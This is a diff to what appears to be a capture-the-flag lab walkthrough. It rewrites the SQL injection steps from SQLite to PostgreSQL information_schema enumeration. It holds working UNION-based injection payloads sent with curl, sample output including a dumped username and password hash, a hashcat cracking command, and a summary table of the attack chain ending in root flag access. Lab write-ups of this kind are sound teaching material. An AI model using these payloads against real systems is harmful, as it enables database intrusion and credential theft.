@@ -96,30 +96,46 @@ curl "http://<TARGET>/search/index.php?id=0 UNION SELECT 1,2--"
 
 Returns: `1 | 2` — confirms 2-column output.
 
-**Enumerate databases/schemas:**
-
-> This lab uses SQLite. SQLite has no `information_schema` — use `sqlite_master` instead.
+**Enumerate schemas:**
 
 ```bash
-# List all tables
-curl "http://<TARGET>/search/index.php?id=0 UNION SELECT name,sql FROM sqlite_master WHERE type='table'--"
-```
-
-Returns something like:
-```
-employees | CREATE TABLE employees (id INTEGER, name TEXT, department TEXT, username TEXT, password TEXT)
-```
-
-**Enumerate columns** (already revealed by the `sql` field above, but explicitly):
-
-```bash
-# Read schema of a specific table
-curl "http://<TARGET>/search/index.php?id=0 UNION SELECT sql,1 FROM sqlite_master WHERE type='table' AND name='employees'--"
+# List all schemas
+curl "http://<TARGET>/search/index.php?id=0 UNION SELECT schema_name,1 FROM information_schema.schemata--"
 ```
 
 Returns:
 ```
-CREATE TABLE employees (id INTEGER, name TEXT, department TEXT, username TEXT, password TEXT)
+public | 1
+pg_catalog | 1
+information_schema | 1
+```
+
+**Enumerate tables:**
+
+```bash
+# List tables in public schema
+curl "http://<TARGET>/search/index.php?id=0 UNION SELECT table_name,table_schema FROM information_schema.tables WHERE table_schema='public'--"
+```
+
+Returns:
+```
+employees | public
+```
+
+**Enumerate columns:**
+
+```bash
+# List columns in employees table
+curl "http://<TARGET>/search/index.php?id=0 UNION SELECT column_name,data_type FROM information_schema.columns WHERE table_name='employees'--"
+```
+
+Returns:
+```
+id | integer
+name | text
+username | text
+password | text
+department | text
 ```
 
 Now you know the column names. **Extract credentials:**
@@ -241,7 +257,8 @@ cat /root/.flag.txt
 |------|---------|--------|
 | Port scan | `nmap -sV <TARGET>` | SSH + HTTP discovered |
 | Dir enum | `gobuster dir ... -x php` | `/search` found |
-| SQLi enum | `?id=0 UNION SELECT name,sql FROM sqlite_master WHERE type='table'--` | tables + columns revealed |
+| SQLi enum | `?id=0 UNION SELECT table_name,1 FROM information_schema.tables WHERE table_schema='public'--` | tables revealed |
+| SQLi enum | `?id=0 UNION SELECT column_name,data_type FROM information_schema.columns WHERE table_name='employees'--` | columns revealed |
 | SQLi dump | `?id=0 UNION SELECT username,password FROM employees--` | `john:0571749e2ac330a7455809c6b0e7af90` |
 | Hash crack | `hashcat -m 0 hash.txt rockyou.txt` | `sunshine` |
 | SSH | `ssh john@<TARGET>` | Flag 2 + secret.zip |
